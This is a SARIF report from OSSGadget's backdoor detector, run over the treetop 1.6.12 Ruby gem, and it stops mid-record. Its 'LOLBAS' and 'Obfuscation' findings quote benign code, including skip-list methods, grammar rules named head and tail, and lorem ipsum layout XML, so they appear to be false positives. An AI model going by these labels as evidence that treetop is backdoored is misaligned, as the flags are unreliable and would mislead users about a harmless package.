{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/runtime/interval_skip_list/interval_skip_lis"
                },
                "region": {
                  "startLine": 188,
                  "startColumn": 3,
                  "endLine": 188,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    node.forward_markers[level].delete(marker)\n    next_node = node.forward[level]\n    next_node.markers.delete(marker)\n    node = next_node\n  end\n\n  def nodes\n",
                    "rendered": {
                      "text": "    node.forward_markers[level].delete(marker)\n    next_node = node.forward[level]\n    next_node.markers.delete(marker)\n    node = next_node\n  end\n\n  def nodes\n",
                      "markdown": "`    node.forward_markers[level].delete(marker)\n    next_node = node.forward[level]\n    next_node.markers.delete(marker)\n    node = next_node\n  end\n\n  def nodes\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/runtime/interval_skip_list/interval_skip_lis"
                },
                "region": {
                  "startLine": 181,
                  "startColumn": 3,
                  "endLine": 181,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    node.forward_markers[level].push(marker)\n    next_node = node.forward[level]\n    next_node.markers.push(marker)\n    node = next_node\n  end\n\n  def unmark_forward_path_at_level(node, level, marker)\n",
                    "rendered": {
                      "text": "    node.forward_markers[level].push(marker)\n    next_node = node.forward[level]\n    next_node.markers.push(marker)\n    node = next_node\n  end\n\n  def unmark_forward_path_at_level(node, level, marker)\n",
                      "markdown": "`    node.forward_markers[level].push(marker)\n    next_node = node.forward[level]\n    next_node.markers.push(marker)\n    node = next_node\n  end\n\n  def unmark_forward_path_at_level(node, level, marker)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/runtime/interval_skip_list/interval_skip_lis"
                },
                "region": {
                  "startLine": 135,
                  "startColumn": 14,
                  "endLine": 136,
                  "snippet": {
                    "text": "  end\n  \n  def find(key, path)\n    cur_node = head\n    (max_height - 1).downto(0) do |cur_level|\n      while (next_node = cur_node.forward[cur_level]) && next_node.key < key\n        cur_node = next_node\n      end\n",
                    "rendered": {
                      "text": "  end\n  \n  def find(key, path)\n    cur_node = head\n    (max_height - 1).downto(0) do |cur_level|\n      while (next_node = cur_node.forward[cur_level]) && next_node.key < key\n        cur_node = next_node\n      end\n",
                      "markdown": "`  end\n  \n  def find(key, path)\n    cur_node = head\n    (max_height - 1).downto(0) do |cur_level|\n      while (next_node = cur_node.forward[cur_level]) && next_node.key < key\n        cur_node = next_node\n      end\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/runtime/interval_skip_list/interval_skip_lis"
                },
                "region": {
                  "startLine": 114,
                  "startColumn": 14,
                  "endLine": 115,
                  "snippet": {
                    "text": "\n  def containing_with_node(n)\n    containing = []\n    cur_node = head\n    (max_height - 1).downto(0) do |cur_level|\n      while (next_node = cur_node.forward[cur_level]) && next_node.key <= n\n        cur_node = next_node\n        if cur_node.key == n\n",
                    "rendered": {
                      "text": "\n  def containing_with_node(n)\n    containing = []\n    cur_node = head\n    (max_height - 1).downto(0) do |cur_level|\n      while (next_node = cur_node.forward[cur_level]) && next_node.key <= n\n        cur_node = next_node\n        if cur_node.key == n\n",
                      "markdown": "`\n  def containing_with_node(n)\n    containing = []\n    cur_node = head\n    (max_height - 1).downto(0) do |cur_level|\n      while (next_node = cur_node.forward[cur_level]) && next_node.key <= n\n        cur_node = next_node\n        if cur_node.key == n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.treetop"
                },
                "region": {
                  "startLine": 149,
                  "startColumn": 13,
                  "endLine": 150,
                  "snippet": {
                    "text": "            self\n          end\n\n          def tail\n            []\n          end\n        }\n      end\n",
                    "rendered": {
                      "text": "            self\n          end\n\n          def tail\n            []\n          end\n        }\n      end\n",
                      "markdown": "`            self\n          end\n\n          def tail\n            []\n          end\n        }\n      end\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.treetop"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 13,
                  "endLine": 146,
                  "snippet": {
                    "text": "\n      rule labeled_expression_sequence_body\n        labeled_sequence_primary {\n          def head\n            self\n          end\n\n          def tail\n",
                    "rendered": {
                      "text": "\n      rule labeled_expression_sequence_body\n        labeled_sequence_primary {\n          def head\n            self\n          end\n\n          def tail\n",
                      "markdown": "`\n      rule labeled_expression_sequence_body\n        labeled_sequence_primary {\n          def head\n            self\n          end\n\n          def tail\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.treetop"
                },
                "region": {
                  "startLine": 137,
                  "startColumn": 13,
                  "endLine": 138,
                  "snippet": {
                    "text": "\n      rule variable_length_sequence_body\n        head:optionally_labeled_sequence_primary tail:(space optionally_labeled_sequence_primary)+ {\n          def tail\n            super.elements.map {|elt| elt.optionally_labeled_sequence_primary }\n          end\n        }\n      end\n",
                    "rendered": {
                      "text": "\n      rule variable_length_sequence_body\n        head:optionally_labeled_sequence_primary tail:(space optionally_labeled_sequence_primary)+ {\n          def tail\n            super.elements.map {|elt| elt.optionally_labeled_sequence_primary }\n          end\n        }\n      end\n",
                      "markdown": "`\n      rule variable_length_sequence_body\n        head:optionally_labeled_sequence_primary tail:(space optionally_labeled_sequence_primary)+ {\n          def tail\n            super.elements.map {|elt| elt.optionally_labeled_sequence_primary }\n          end\n        }\n      end\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.treetop"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 13,
                  "endLine": 108,
                  "snippet": {
                    "text": "            [sequence_body.head] + tail\n          end\n\n          def tail\n            sequence_body.tail\n          end\n\n\t  def parent_modules\n",
                    "rendered": {
                      "text": "            [sequence_body.head] + tail\n          end\n\n          def tail\n            sequence_body.tail\n          end\n\n\t  def parent_modules\n",
                      "markdown": "`            [sequence_body.head] + tail\n          end\n\n          def tail\n            sequence_body.tail\n          end\n\n\t  def parent_modules\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.treetop"
                },
                "region": {
                  "startLine": 104,
                  "startColumn": 34,
                  "endLine": 105,
                  "snippet": {
                    "text": "      rule sequence\n        sequence_body node_class_declarations <Sequence> {\n          def sequence_elements\n            [sequence_body.head] + tail\n          end\n\n          def tail\n            sequence_body.tail\n",
                    "rendered": {
                      "text": "      rule sequence\n        sequence_body node_class_declarations <Sequence> {\n          def sequence_elements\n            [sequence_body.head] + tail\n          end\n\n          def tail\n            sequence_body.tail\n",
                      "markdown": "`      rule sequence\n        sequence_body node_class_declarations <Sequence> {\n          def sequence_elements\n            [sequence_body.head] + tail\n          end\n\n          def tail\n            sequence_body.tail\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.treetop"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 13,
                  "endLine": 84,
                  "snippet": {
                    "text": "            [head] + tail\n          end\n\n          def tail\n            super.elements.map {|elt| elt.alternative}\n          end\n\n\t  def parent_modules\n",
                    "rendered": {
                      "text": "            [head] + tail\n          end\n\n          def tail\n            super.elements.map {|elt| elt.alternative}\n          end\n\n\t  def parent_modules\n",
                      "markdown": "`            [head] + tail\n          end\n\n          def tail\n            super.elements.map {|elt| elt.alternative}\n          end\n\n\t  def parent_modules\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.treetop"
                },
                "region": {
                  "startLine": 80,
                  "startColumn": 20,
                  "endLine": 81,
                  "snippet": {
                    "text": "      rule choice\n        head:alternative tail:(space? '/' space? alternative)+ <Choice> {\n          def alternatives\n            [head] + tail\n          end\n\n          def tail\n            super.elements.map {|elt| elt.alternative}\n",
                    "rendered": {
                      "text": "      rule choice\n        head:alternative tail:(space? '/' space? alternative)+ <Choice> {\n          def alternatives\n            [head] + tail\n          end\n\n          def tail\n            super.elements.map {|elt| elt.alternative}\n",
                      "markdown": "`      rule choice\n        head:alternative tail:(space? '/' space? alternative)+ <Choice> {\n          def alternatives\n            [head] + tail\n          end\n\n          def tail\n            super.elements.map {|elt| elt.alternative}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.treetop"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 13,
                  "endLine": 47,
                  "snippet": {
                    "text": "            [head] + tail\n          end\n\n          def tail\n            super.elements.map { |elt| elt.declaration }\n          end\n        }\n        /\n",
                    "rendered": {
                      "text": "            [head] + tail\n          end\n\n          def tail\n            super.elements.map { |elt| elt.declaration }\n          end\n        }\n        /\n",
                      "markdown": "`            [head] + tail\n          end\n\n          def tail\n            super.elements.map { |elt| elt.declaration }\n          end\n        }\n        /\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.treetop"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 20,
                  "endLine": 44,
                  "snippet": {
                    "text": "      rule declaration_sequence\n        head:declaration tail:(space declaration)* <DeclarationSequence> {\n          def declarations\n            [head] + tail\n          end\n\n          def tail\n            super.elements.map { |elt| elt.declaration }\n",
                    "rendered": {
                      "text": "      rule declaration_sequence\n        head:declaration tail:(space declaration)* <DeclarationSequence> {\n          def declarations\n            [head] + tail\n          end\n\n          def tail\n            super.elements.map { |elt| elt.declaration }\n",
                      "markdown": "`      rule declaration_sequence\n        head:declaration tail:(space declaration)* <DeclarationSequence> {\n          def declarations\n            [head] + tail\n          end\n\n          def tail\n            super.elements.map { |elt| elt.declaration }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/runtime/interval_skip_list/node.rb"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 7,
                  "endLine": 2,
                  "endColumn": 13,
                  "snippet": {
                    "text": "class IntervalSkipList\n  class Node < HeadNode\n    attr_accessor :key\n    attr_reader :markers, :endpoint_of\n\n",
                    "rendered": {
                      "text": "class IntervalSkipList\n  class Node < HeadNode\n    attr_accessor :key\n    attr_reader :markers, :endpoint_of\n\n",
                      "markdown": "`class IntervalSkipList\n  class Node < HeadNode\n    attr_accessor :key\n    attr_reader :markers, :endpoint_of\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/ruby_builder.rb"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 7,
                  "endLine": 21,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      end\n\n      def newline\n        ruby << \"\\n\"\n      end\n      \n      def indented(depth = 2)\n",
                    "rendered": {
                      "text": "      end\n\n      def newline\n        ruby << \"\\n\"\n      end\n      \n      def indented(depth = 2)\n",
                      "markdown": "`      end\n\n      def newline\n        ruby << \"\\n\"\n      end\n      \n      def indented(depth = 2)\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/ruby_builder.rb"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 7,
                  "endLine": 17,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      \n      def <<(ruby_line)              \n        return if ruby_line == ''\n        ruby << ruby_line.tabto(level) << \"\\n\"\n      end\n\n      def newline\n",
                    "rendered": {
                      "text": "      \n      def <<(ruby_line)              \n        return if ruby_line == ''\n        ruby << ruby_line.tabto(level) << \"\\n\"\n      end\n\n      def newline\n",
                      "markdown": "`      \n      def <<(ruby_line)              \n        return if ruby_line == ''\n        ruby << ruby_line.tabto(level) << \"\\n\"\n      end\n\n      def newline\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/Treetop.tmbundle/Support/nibs/SyntaxTreeViewer.nib/desig"
                },
                "region": {
                  "startLine": 148,
                  "startColumn": 598,
                  "endLine": 148,
                  "endColumn": 602,
                  "snippet": {
                    "text": "uis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum Et harumd und lookum like Greek to me, dereud facilis est er expedit distinct. Nam liber te conscient to factor tum poen legum odioque civiuda</characters>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</object>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSMutableArray\" key=\"NSAttributes\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<bool key=\"EncodedWithXMLCoder\">YES</bool>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSDictionary\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<bool ke",
                    "rendered": {
                      "text": "uis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum Et harumd und lookum like Greek to me, dereud facilis est er expedit distinct. Nam liber te conscient to factor tum poen legum odioque civiuda</characters>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</object>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSMutableArray\" key=\"NSAttributes\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<bool key=\"EncodedWithXMLCoder\">YES</bool>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSDictionary\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<bool ke",
                      "markdown": "`uis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum Et harumd und lookum like Greek to me, dereud facilis est er expedit distinct. Nam liber te conscient to factor tum poen legum odioque civiuda</characters>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</object>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSMutableArray\" key=\"NSAttributes\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<bool key=\"EncodedWithXMLCoder\">YES</bool>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSDictionary\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<bool ke`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/Treetop.tmbundle/Support/nibs/SyntaxTreeViewer.nib/desig"
                },
                "region": {
                  "startLine": 148,
                  "startColumn": 121,
                  "endLine": 148,
                  "endColumn": 126,
                  "snippet": {
                    "text": "ass=\"NSLayoutManager\" key=\"NSLayoutManager\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSTextStorage\" key=\"NSTextStorage\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSMutableString\" key=\"NSString\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<characters key=\"NS.bytes\">Lorem ipsum dolor sit er elit lamet, consectetaur cillium adipisicing pecu, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cu",
                    "rendered": {
                      "text": "ass=\"NSLayoutManager\" key=\"NSLayoutManager\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSTextStorage\" key=\"NSTextStorage\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSMutableString\" key=\"NSString\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<characters key=\"NS.bytes\">Lorem ipsum dolor sit er elit lamet, consectetaur cillium adipisicing pecu, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cu",
                      "markdown": "`ass=\"NSLayoutManager\" key=\"NSLayoutManager\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSTextStorage\" key=\"NSTextStorage\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<object class=\"NSMutableString\" key=\"NSString\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<characters key=\"NS.bytes\">Lorem ipsum dolor sit er elit lamet, consectetaur cillium adipisicing pecu, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cu`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/Treetop.tmbundle/Support/nibs/SyntaxTreeViewer.nib/desig"
                },
                "region": {
                  "startLine": 918,
                  "startColumn": 20,
                  "endLine": 918,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\t\t\t\t\t\t<int key=\"objectID\">-2</int>\n\t\t\t\t\t\t<reference key=\"object\" ref=\"1001\"/>\n\t\t\t\t\t\t<reference key=\"parent\" ref=\"1002\"/>\n\t\t\t\t\t\t<string type=\"base64-UTF8\" key=\"objectName\">RmlsZSdzIE93bmVyA</string>\n\t\t\t\t\t</object>\n\t\t\t\t\t<object class=\"IBObjectRecord\">\n\t\t\t\t\t\t<int key=\"objectID\">-1</int>\n",
                    "rendered": {
                      "text": "\t\t\t\t\t\t<int key=\"objectID\">-2</int>\n\t\t\t\t\t\t<reference key=\"object\" ref=\"1001\"/>\n\t\t\t\t\t\t<reference key=\"parent\" ref=\"1002\"/>\n\t\t\t\t\t\t<string type=\"base64-UTF8\" key=\"objectName\">RmlsZSdzIE93bmVyA</string>\n\t\t\t\t\t</object>\n\t\t\t\t\t<object class=\"IBObjectRecord\">\n\t\t\t\t\t\t<int key=\"objectID\">-1</int>\n",
                      "markdown": "`\t\t\t\t\t\t<int key=\"objectID\">-2</int>\n\t\t\t\t\t\t<reference key=\"object\" ref=\"1001\"/>\n\t\t\t\t\t\t<reference key=\"parent\" ref=\"1002\"/>\n\t\t\t\t\t\t<string type=\"base64-UTF8\" key=\"objectName\">RmlsZSdzIE93bmVyA</string>\n\t\t\t\t\t</object>\n\t\t\t\t\t<object class=\"IBObjectRecord\">\n\t\t\t\t\t\t<int key=\"objectID\">-1</int>\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/Treetop.tmbundle/Support/nibs/SyntaxTreeViewer.nib/desig"
                },
                "region": {
                  "startLine": 100,
                  "startColumn": 26,
                  "endLine": 100,
                  "endColumn": 32,
                  "snippet": {
